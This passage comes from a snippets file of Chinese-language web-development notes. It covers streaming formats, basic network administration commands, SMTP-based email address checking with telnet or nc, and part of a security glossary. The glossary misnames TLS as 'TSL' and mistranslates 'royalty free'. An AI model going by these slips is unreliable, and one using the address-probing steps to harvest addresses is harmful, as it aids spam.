Source Extensions (MSE)<a href=\"#media-source-extensions-mse\" class=\"hash-link\" aria-label=\"Media Source Extensions (MSE)的直接連結\" title=\"Media Source Extensions (MSE)的直接連結\">​</a></h2><p><a href=\"https://dvcs.w3.org/hg/html-media/raw-file/tip/media-source/media-source.html\" target=\"_blank\" rel=\"noopener noreferrer\">Media Source Extensions</a> 是 W3C 用來延伸 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement\" target=\"_blank\" rel=\"noopener noreferrer\"><code>HTMLMediaElement</code></a> 以允許 JavaScript 產生影音串流來播放，讓 JavaScript 產生串流可以增加很多可用的情境，像是自適性串流（adaptive streaming）和 Time shifting live streams。</p><blockquote><p><a href=\"https://w3c.github.io/media-source/\" target=\"_blank\" rel=\"noopener noreferrer\">Media Source Extensions</a> @ W3C Editors Draft</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"影片串流檔案格式video-streaming-file-formats\">影片串流檔案格式（Video Streaming File Formats）<a href=\"#影片串流檔案格式video-streaming-file-formats\" class=\"hash-link\" aria-label=\"影片串流檔案格式（Video Streaming File Formats）的直接連結\" title=\"影片串流檔案格式（Video Streaming File Formats）的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"mpeg-dash\">MPEG-DASH<a href=\"#mpeg-dash\" class=\"hash-link\" aria-label=\"MPEG-DASH的直接連結\" title=\"MPEG-DASH的直接連結\">​</a></h3><p>DASH 指的是 <strong>Dynamic Adaptive Streaming over HTTP</strong>，透過 Media Source Extensions 的 JavaScript 函式庫可以支援多數瀏覽器（如，<a href=\"https://github.com/Dash-Industry-Forum/dash.js/\" target=\"_blank\" rel=\"noopener noreferrer\">DASH.js</a> ），它讓我們可以使用 XHR 下載許多影片串流的片段（chunks），並將這些片段結合起來透過 <code>&lt;video&gt;</code> 元素播放。舉例來說，當我們偵測到網路速度變慢時，我們開始請求低品質（較小的）片段來供之後使用，這個技術也讓廣告相關的片段可以插入串流中。</p><blockquote><p>[對 WebM 使用 MPEG DASH 自適性串流]<!-- -->(<a href=\"http://wiki.webmproject.org/adaptive-streaming/webm-dash-specification\" target=\"_blank\" rel=\"noopener noreferrer\">use WebM with the MPEG DASH adaptive streaming system</a>.) @ webm wiki</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"hls-http-live-streaming\">HLS (HTTP Live Streaming)<a href=\"#hls-http-live-streaming\" class=\"hash-link\" aria-label=\"HLS (HTTP Live Streaming)的直接連結\" title=\"HLS (HTTP Live Streaming)的直接連結\">​</a></h3><p>HLS 是由 Apple 發明，也是自適性的。它可以透過 JavaScript 解碼，因此多數瀏覽器都支援。在串流的開始會有 <a href=\"http://en.wikipedia.org/wiki/M3U8#Extended_M3U_directives\" target=\"_blank\" rel=\"noopener noreferrer\">extended M3U (m3u8) playlist</a> 可以下載，它包含許多所提供的 sub-streams 描述性資料（metadata）。</p><blockquote><ul><li><a href=\"../../../github.com/video-dev/hls.html\" target=\"_blank\" rel=\"noopener noreferrer\">HTTP Live Streaming JavaScript Player</a> @ hls.js GitHub</li><li><a href=\"https://developer.mozilla.org/en-US/Apps/Fundamentals/Audio_and_video_delivery/Setting_up_adaptive_streaming_media_sources\" target=\"_blank\" rel=\"noopener noreferrer\">Setting Up Adaptive Streaming Media Sources</a> @ MDN</li></ul></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"音檔串流檔案格式audio-streaming-file-formats\">音檔串流檔案格式（Audio Streaming File Formats）<a href=\"#音檔串流檔案格式audio-streaming-file-formats\" class=\"hash-link\" aria-label=\"音檔串流檔案格式（Audio Streaming File Formats）的直接連結\" title=\"音檔串流檔案格式（Audio Streaming File Formats）的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"opus\">Opus<a href=\"#opus\" class=\"hash-link\" aria-label=\"Opus的直接連結\" title=\"Opus的直接連結\">​</a></h3><p>Opus 是一種買斷式授權（royalty free）且公開的檔案格式，可以對不同類型的音訊檔，優化在不同位元速率（bitrate）下品質。音樂和演說有不同的優化方式，其中 Opus 使用 SILK 和 CELT 編解碼器（codec）來達到。當今多數的瀏覽器有支援此格式。</p><blockquote><p>[Opus 是 WebRTC 瀏覽器實作時必要的格式]<!-- -->(<a href=\"http://tools.ietf.org/html/draft-ietf-rtcweb-audio-05\" target=\"_blank\" rel=\"noopener noreferrer\">Opus is a mandatory format</a> for WebRTC browser implementations.)</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"mp3-aac-ogg-vorbis\">MP3, AAC, Ogg Vorbis<a href=\"#mp3-aac-ogg-vorbis\" class=\"hash-link\" aria-label=\"MP3, AAC, Ogg Vorbis的直接連結\" title=\"MP3, AAC, Ogg Vorbis的直接連結\">​</a></h3><p>大部分的音檔格式都可以使用特定的伺服器技術來處理串流。</p><blockquote><p>在串流音檔時，使用非串流的檔案格式相對容易些，因為和影片不同，音檔沒有影格（keyframes）。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"伺服器端的串流技術server-side-streaming-technologies\">伺服器端的串流技術（Server-side Streaming Technologies）<a href=\"#伺服器端的串流技術server-side-streaming-technologies\" class=\"hash-link\" aria-label=\"伺服器端的串流技術（Server-side Streaming Technologies）的直接連結\" title=\"伺服器端的串流技術（Server-side Streaming Technologies）的直接連結\">​</a></h2><p>為了要能夠串流即時的媒體，你需要在伺服器使用特定的串流軟體或第三方服務。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"gstreamer\">GStreamer<a href=\"#gstreamer\" class=\"hash-link\" aria-label=\"GStreamer的直接連結\" title=\"GStreamer的直接連結\">​</a></h3><p><a href=\"http://gstreamer.freedesktop.org/\" target=\"_blank\" rel=\"noopener noreferrer\">GStreamer</a> 是一個開源且跨平台的多媒體框架，讓你可以建立許多用來處理媒體的元件，包含串流元件，透過它的插件系統，GStreamer 支援多種編解碼（codec），包含 MPEG-1, MPEG-2, MPEG-4, H.261, H.263, H.264, RealVideo, MP3, WMV 和 FLV。</p><p>GStreamer 的插件像是 <a href=\"http://gstreamer.freedesktop.org/data/doc/gstreamer/head/gst-plugins-good-plugins/html/gst-plugins-good-plugins-plugin-soup.html\" target=\"_blank\" rel=\"noopener noreferrer\">souphttpclientsink</a> 和 <a href=\"https://gstreamer.freedesktop.org/data/doc/gstreamer/head/gst-plugins-good/html/gst-plugins-good-plugins-shout2send.html\" target=\"_blank\" rel=\"noopener noreferrer\">shout2send</a> 用來透過 HTTP 串流媒體，你也可以整合進 Python 的 Twisted 框架或使用其他像是 <a href=\"http://www.flumotion.net/features/\" target=\"_blank\" rel=\"noopener noreferrer\">Flumotion</a> 這類開源的串流軟體。</p><p>如果是針對 RTMP 的傳輸，可以使用 <a href=\"https://github.com/arut/nginx-rtmp-module\" target=\"_blank\" rel=\"noopener noreferrer\">Nginx RTMP Module</a>。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"shoutcast\">SHOUTcast<a href=\"#shoutcast\" class=\"hash-link\" aria-label=\"SHOUTcast的直接連結\" title=\"SHOUTcast的直接連結\">​</a></h3><p><a href=\"http://en.wikipedia.org/wiki/SHOUTcast\" target=\"_blank\" rel=\"noopener noreferrer\">SHOUTcast</a> 是擁有跨平台串流媒體的獨家技術，它是由 Nullsoft 開發，可以允許數位 MP3 或 AAC 的音檔被廣播。使用在網頁上時，依樣是透過 HTTP 傳輸。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"icecast\">Icecast<a href=\"#icecast\" class=\"hash-link\" aria-label=\"Icecast的直接連結\" title=\"Icecast的直接連結\">​</a></h3><p><a href=\"http://www.icecast.org/\" target=\"_blank\" rel=\"noopener noreferrer\">Icecast</a> 伺服器是一個媒體串流的開源技術，由 <a href=\"http://www.xiph.org/\" target=\"_blank\" rel=\"noopener noreferrer\">Xiph.org Foundation</a> 維護，它可以透過 SHOUTcast protocol 串流 Ogg Vorbis/Theora、MP3 或 ACC 的檔案格式。</p><blockquote><p>SHOUTcast 和 Icecast 算是最任何的媒體串流技術，但還有<a href=\"http://en.wikipedia.org/wiki/List_of_streaming_media_systems#Servers\" target=\"_blank\" rel=\"noopener noreferrer\">其他許多可用的媒體串流系統</a>，以及<!-- -->[第三方的串流服務]<!-- -->(<a href=\"http://en.wikipedia.org/wiki/Comparison_of_streaming_media_systems\" target=\"_blank\" rel=\"noopener noreferrer\">third party streaming services</a> )。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"延伸閱讀\">延伸閱讀<a href=\"#延伸閱讀\" class=\"hash-link\" aria-label=\"延伸閱讀的直接連結\" title=\"延伸閱讀的直接連結\">​</a></h2><ul><li>說明如何使用 ffmpeg 下載 M3U8 影音串流檔：<a href=\"https://notfalse.net/63/m3u8-intro\" target=\"_blank\" rel=\"noopener noreferrer\">M3U8 串流影音 — 概念與下載</a> @NotFalse</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://developer.mozilla.org/en-US/Apps/Fundamentals/Audio_and_video_delivery/Live_streaming_web_audio_and_video\" target=\"_blank\" rel=\"noopener noreferrer\">Live Streaming Web Audio and Video</a> @ MDN</li><li><a href=\"https://developer.mozilla.org/en-US/Apps/Fundamentals/Audio_and_video_delivery/Setting_up_adaptive_streaming_media_sources\" target=\"_blank\" rel=\"noopener noreferrer\">Setting Up Adaptive Streaming Media Sources</a> @ MDN</li><li><a href=\"https://w3c.github.io/media-source/\" target=\"_blank\" rel=\"noopener noreferrer\">Media Source Extensions</a> @ W3C Editors Draft</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"原始文章\">原始文章<a href=\"#原始文章\" class=\"hash-link\" aria-label=\"原始文章的直接連結\" title=\"原始文章的直接連結\">​</a></h2><ul><li><a href=\"https://developer.mozilla.org/en-US/Apps/Fundamentals/Audio_and_video_delivery/Live_streaming_web_audio_and_video\" target=\"_blank\" rel=\"noopener noreferrer\">Live Streaming Web Audio and Video</a> @ MDN</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] 網路管理實戰 pjchender.dev": {
    "prefix": "hinternet [網際網路] 網路管理實戰 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 網路管理實戰</h1></header><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">ssh</span><span class=\"token plain\"> wavinfo@192.168.1.4    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 登入主機</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ w                 </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 列出現在主機上有的使用者資訊與程序</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">who</span><span class=\"token plain\">               </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 列出有誰登入</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">users</span><span class=\"token plain\">             </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 列出使用者</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># write &lt;user&gt; &lt;pts/#&gt;      # 傳訊</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">write</span><span class=\"token plain\"> wavinfo pts/1        </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 傳送訊息給單一對象（進入對話，可連續傳送）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ wall </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;Hello, World!&quot;</span><span class=\"token plain\">      </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 廣播訊息給所有人</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token builtin class-name\" style=\"color:rgb(255, 203, 107)\">echo</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;Some text goes here&quot;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">|</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">write</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&lt;</span><span class=\"token plain\">user</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&gt;</span><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 傳送訊息給單一對象（一次一句）</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"重新啟動服務\">重新啟動服務<a href=\"#重新啟動服務\" class=\"hash-link\" aria-label=\"重新啟動服務的直接連結\" title=\"重新啟動服務的直接連結\">​</a></h2><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ pm2 list               </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 列出 pm2 的服務</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ pm2 resurrect          </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 重新啟動 pm2 服務</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"查詢-ssl\">查詢 SSL<a href=\"#查詢-ssl\" class=\"hash-link\" aria-label=\"查詢 SSL的直接連結\" title=\"查詢 SSL的直接連結\">​</a></h2><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 如果有看到 TLS 的訊息綁定有 SSL</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ curl -vI https://apff.film</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cli\">CLI<a href=\"#cli\" class=\"hash-link\" aria-label=\"CLI的直接連結\" title=\"CLI的直接連結\">​</a></h2><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 若不清楚該指令可以使用 man 指令查詢用法：$ man &lt;指令&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ping &lt;host&gt;              # 是否能與指定的 host 通訊</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ dig &lt;server&gt; &lt;name&gt; &lt;type&gt;      # DNS lookup 工具</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ nslookup &lt;host&gt;        # 輸入 Domain 會回傳 IP</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ traceroute &lt;host&gt;       # 列出封包在抵達某主機前會經過的路由</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ route              # 手動修改路由表</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ifconfig -a          # 列出或修改和網路介面有關的參數</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"檢驗-email-是否存在\">檢驗 Email 是否存在<a href=\"#檢驗-email-是否存在\" class=\"hash-link\" aria-label=\"檢驗 Email 是否存在的直接連結\" title=\"檢驗 Email 是否存在的直接連結\">​</a></h2><blockquote><p>資料來源：<a href=\"http://www.ruanyifeng.com/blog/2017/06/smtp-protocol.html\" target=\"_blank\" rel=\"noopener noreferrer\">如何驗證 Email 地址：SMTP 協議入門教程</a> @ 阮一峰的網絡日誌</p></blockquote><p>思路如下：</p><ol><li>找到郵箱所在域名的 SMTP 服務器</li><li>連接該服務器</li><li>詢問有沒有該郵箱</li><li>如果服務器返回 250 或 251 狀態碼，郵箱就是真的；如果返回 5xx（500 ～ 599），就是假的。</li></ol><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"1-使用-nslookup-查詢郵件伺服器\">1. 使用 nslookup 查詢郵件伺服器<a href=\"#1-使用-nslookup-查詢郵件伺服器\" class=\"hash-link\" aria-label=\"1. 使用 nslookup 查詢郵件伺服器的直接連結\" title=\"1. 使用 nslookup 查詢郵件伺服器的直接連結\">​</a></h4><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 找不到表示該郵件不存在</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ nslookup</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&gt; set q=mx</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&gt; gmail.com</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"2-建立-tcp-連結\">2. 建立 TCP 連結<a href=\"#2-建立-tcp-連結\" class=\"hash-link\" aria-label=\"2. 建立 TCP 連結的直接連結\" title=\"2. 建立 TCP 連結的直接連結\">​</a></h4><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 使用 telnet</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ telnet gmail-smtp-in.l.google.com 25</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 或者 nc</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ nc gmail-smtp-in.l.google.com 25</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"3-詢問有沒有該信箱\">3. 詢問有沒有該信箱<a href=\"#3-詢問有沒有該信箱\" class=\"hash-link\" aria-label=\"3. 詢問有沒有該信箱的直接連結\" title=\"3. 詢問有沒有該信箱的直接連結\">​</a></h4><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 先透過 nc 或 telnet 建立 TCP 連結</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">EHLO wavinfo.com         # 回傳 250 表示伺服器成功回應</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">MAIL FROM:&lt;mail@example.com&gt;   # 向郵件伺服器提供寄件人信箱，250 表示成功回應</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 驗證此郵件地只是否存在</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 250, 251 表示此 Email 有效</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 4xx 表示無法確認</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 5xx, 550 表示此為無效的 Email</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">RCPT TO:&lt;aaronchen@gmail.com&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">QUIT   # 離開</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] 網路管理 MIS 與資訊安全 IS 專有名詞 pjchender.dev": {
    "prefix": "hinternet [網際網路] 網路管理 MIS 與資訊安全 IS 專有名詞 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] 網路管理 MIS 與資訊安全 IS 專有名詞</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"關鍵字terms\">關鍵字（terms）<a href=\"#關鍵字terms\" class=\"hash-link\" aria-label=\"關鍵字（terms）的直接連結\" title=\"關鍵字（terms）的直接連結\">​</a></h2><table><thead><tr><th>詞彙</th><th>解釋</th></tr></thead><tbody><tr><td>MITM (Man-in-the-middle attack)</td><td><code>中間人攻擊</code>。在使用者跟購物網站之間的任一節點進行封包側錄，以竊取使用者的重要資料。</td></tr><tr><td>SSL (Secure Sockets Layer)</td><td><code>安全通訊端層</code>。這是一種標準的技術，用於保持網際網路連線安全以及防止在兩個系統之間發送的所有敏感資料被罪犯讀取及修改任何傳輸的資訊。最高版本為 SSL 3.0，之後均為 TSL。</td></tr><tr><td>TSL (Transport Layer Security)</td><td><code>傳輸層安全性</code>。更新、更安全的 SSL 版本。</td></tr><tr><td>HTTPS (Hyper Text Transfer Protocol Secure)</td><td><code>超級文字傳輸協議安全</code>。會在網站受到 SSL 憑證保護時在網址中出現。</td></tr><tr><td>D-H (Diffie–Hellman key exchange)</td><td><code>迪菲-赫爾曼密鑰交換</code>。可以在公開管道建立一把密鑰的方式。</td></tr><tr><td>CORS (Cross Origin Resource 